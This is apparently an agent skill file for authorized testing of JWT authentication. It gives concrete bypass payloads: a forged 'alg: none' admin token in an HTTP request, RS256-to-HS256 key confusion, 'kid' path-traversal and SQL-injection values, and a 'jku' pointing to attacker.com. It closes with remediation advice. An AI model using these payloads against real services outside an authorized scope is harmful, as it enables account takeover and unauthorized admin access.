---
name: identity-jwt-manipulation
description: JSON Web Token signature bypasses, algorithm confusion (none and RS256 to HS256), header injection (jwk, jku, kid path traversal), and token claim tampering.
---

# JSON Web Token (JWT) Security Assessment & Signature Bypasses

## 1. Prerequisites & Input Contract
- **Authorization Scope:** Target API endpoints accepting JWT authentication tokens in `scope.yaml`.
- **Target Credentials:** Valid low-privilege JWT acquired during Phase 0/1 authentication.
- **Tools:** Caido MCP (`caido_send_request`) or python `jwt` / `cryptography` libraries.

---

## 2. Core Attack Heuristics & Step-by-Step Flow

### Step 1: JWT Header & Payload Anatomy
Decode the target token and inspect the header parameters:
```json
// Header
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "key-2026-v1"
}
// Payload
{
  "sub": "usr_12345",
  "role": "user",
  "tenant_id": "tenant_abc",
  "exp": 1787889900
}
```

### Step 2: Unverified Signature & `none` Algorithm Attack
1. **Strip Signature:** Keep header and payload, modify `"alg": "none"`, `"alg": "None"`, `"alg": "NONE"`, or `"alg": "nOnE"`.
2. **Remove Signature Block:** Trailing dot must remain (`eyJ...eyJ...`).
```http
GET /api/v1/admin/dashboard HTTP/1.1
Host: target.example.com
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
```

### Step 3: Key Confusion Attack (RS256 $\rightarrow$ HS256)
If the server verifies tokens using asymmetric cryptography (RSA public key), but accepts the symmetric HMAC (HS256) algorithm:
1. Extract the server's public key (from JWKS `/oauth/v2/keys` or TLS certificate).
2. Change the token header to `"alg": "HS256"`.
3. Sign the tampered payload with HMAC-SHA256 using the **raw PEM string of the RSA public key** as the shared secret.
4. If the verification library passes the public key into `jwt.verify(token, pubkey)` while algorithm is HS256, verification succeeds!

### Step 4: Header Parameter Injection (`kid`, `jwk`, `jku`)
1. **`kid` Path Traversal / Empty Secret:**
   Set `"kid": "/dev/null"` and sign payload with an empty string `""` as HMAC secret:
   ```json
   {"alg": "HS256", "typ": "JWT", "kid": "../../../../../dev/null"}
   ```
2. **`kid` SQL Injection:** If `kid` is queried against a database without parameterization:
   ```json
   {"alg": "HS256", "kid": "key1' UNION SELECT 'my_secret_key'--"}
   ```
   Sign with `'my_secret_key'`.
3. **Embedded JWK / Self-Signed JKU:**
   Inject a self-generated RSA key directly into the header (`"jwk": {...}`) or point `"jku"` to an attacker-controlled JWKS URL.

---

## 3. Empirical Disclosed Report Patterns & High-Risk Matrices

| Vulnerability Vector | Mechanism | Empirical Disclosed Pattern | Expected Evidence Marker |
|---|---|---|---|
| **`kid` Path Traversal to Known File** | Server reads file at `kid` path as HMAC key | `"kid": "/etc/issue"` signed with `/etc/issue` content | HTTP 200 Admin response |
| **Blank Password (`/dev/null`)** | Server reads empty secret | `"kid": "/dev/null"` signed with `""` | Immediate authentication bypass |
| **Weak HMAC Secret Cracking** | Server uses dictionary secret (e.g., `secret`, `jwt123`) | Crack signature with `hashcat -m 16500` in $<10$ seconds | Forged token with `"role": "superadmin"` |
| **JWKS Spoofing via SSRF** | Server downloads JWKS from `"jku"` header | Point `"jku"` to `https://attacker.com/jwks.json` | Server trusts attacker signature |

---

## 4. Evidence Collection & Validation Gate
1. **Self-Contained Proof:** Capture the tampered JWT string, decoded header/payload JSON, and the resulting HTTP 200 response accessing restricted resources.
2. **Impact Proof:** Demonstrate that modifying user identifiers (`sub`, `tenant_id`, `role`) yields unauthorized data or administrative action execution.
3. **Remediation:** Enforce asymmetric algorithm whitelists (e.g. only RS256/ES256), forbid `alg: none`, sanitize and validate `kid` against a hardcoded key identifier list, and restrict JWKS sources.
